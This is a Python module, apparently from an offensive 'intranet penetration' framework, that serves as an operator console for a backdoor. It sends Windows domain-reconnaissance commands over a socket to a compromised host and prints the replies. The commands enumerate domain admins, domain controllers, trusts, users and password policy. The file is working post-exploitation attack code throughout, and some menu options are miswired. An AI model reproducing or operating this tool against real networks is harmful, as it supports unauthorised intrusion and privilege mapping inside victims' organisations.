import struct
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI
from AuxiliaryFunctions import MyTable


def PermissionQuery(conn):
    commands = ["back", "show functions"]
    completer = WordCompleter(commands)
    formatted_text1 = ANSI('\033[1;32;32m(QingLong Framework/Intranet Penetration)-\033[0m\033[1;31;31m[BackDoor/Information ~ Domain Information Query] \033[0m')
    while True:
        choice = prompt(formatted_text1, completer=completer)
        if choice.lower() == 'show functions':
            show_functions()
            continue
        elif choice == 'back':
            break
        elif choice == '1':
            print('\033[1;32;32m' + "[+] 查询当前权限:" + '\033[0m')
        elif choice == '2':
            command = "whoami"
            receive(conn, command)
            print('\033[1;32;32m' + "[+] 查询域:" + '\033[0m')
            command = "net view /domain"
            receive(conn, command)
            print('\033[1;32;32m' + "[+] 查询域内所有用户组列表:" + '\033[0m')
            command = "net group /domain"
            receive(conn, command)
            print('\033[1;32;32m' + "[+] 查询所有域成员计算机列表:" + '\033[0m')
            command = "net group \"domain computers\" /domain"
            receive(conn, command)
        elif choice == '3':
            print('\033[1;32;32m' + "[+] 获取域密码信息:" + '\033[0m')
            command = "net accounts /domain"
            receive(conn, command)
        elif choice == '4':
            print('\033[1;32;32m' + "[+] 获取域信任信息:" + '\033[0m')
            command = "nltest /domain_trusts"
            receive(conn, command)
        elif choice == '5':
            print('\033[1;32;32m' + "[+] 查看域控制器的主机名:" + '\033[0m')
            command = "Nslookup -type=SRV _ldap._tcp"
            receive(conn, command)
            print('\033[1;32;32m' + "[+] 查看域控制器:" + '\033[0m')
            command = "net group \"Domain Controllers\" /domain"
            receive(conn, command)
            print('\033[1;32;32m' + "[+] 获取域内用户的详细信息:" + '\033[0m')
            command = "wmic useraccount get /all"
            receive(conn, command)
            print('\033[1;32;32m' + "[+] 查看存在的用户:" + '\033[0m')
            command = "dsquery user"
            receive(conn, command)
        elif choice == '6':
            print('\033[1;32;32m' + "[+] 查询本地管理员组用户:" + '\033[0m')
            command = "net localgroup administrators"
            receive(conn, command)
            print('\033[1;32;32m' + "[+] 查询域管理员用户:" + '\033[0m')
            command = "net group \"domain admins\" /domain"
            receive(conn, command)
            print('\033[1;32;32m' + "[+] 查询管理员用户组:" + '\033[0m')
            command = "net group \"Enterprise Admins\" /domain"
            receive(conn, command)
        elif choice == '7':
            print('\033[1;32;32m' + "[+] 获取域SID:" + '\033[0m')
            command = "whoami /all"
            receive(conn, command)
        elif choice == '8':
            print('\033[1;32;32m' + "[+] 查看用户:" + '\033[0m')
            command = "net user /domain"
            receive(conn, command)
        elif choice == '9':
            print('\033[1;32;32m' + "[+] 查询当前登录域及登录用户信息:" + '\033[0m')
            command = "net config workstation"
            receive(conn, command)
        elif choice == '10':
            print('\033[1;32;32m' + "[+] 判断主域:" + '\033[0m')
            command = "net time /domain"
            receive(conn, command)


def receive(conn, command):
    conn.sendall(command.encode("gbk"))
    result_len = conn.recv(4)
    real_len = struct.unpack("i", result_len)[0]
    while True:
        if 1024 < real_len:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            real_len = real_len - 1024
            continue
        else:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            break


def show_functions():
    print("\n" + '\033[1;34;34m' + "Domain Information Query" + '\033[0m' + "\n" + '=' * len("Domain Information Query") + "\n")
    headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model", '\033[1;34;34m' + "description" + '\033[0m']
    mydata = [["1", "Current permissions", "当前权限"], ["2", "Domain member information", "域成员信息"], ["3", "Domain password information", "域密码信息"], ["4", "Domain Trust Information", "域信任信息"],
              ["5", "Domain Controller Information", "域控制器信息"], ["6", "Administrator Information", "管理员信息"], ["7", "Domain SID", "域sid"], ["8", "View Users", "查看用户"], ["9", "Domain login information", "域登录信息"],
              ["10", "Determine the primary domain", "判断主域"]]
    MyTable.createTable(headers, mydata)
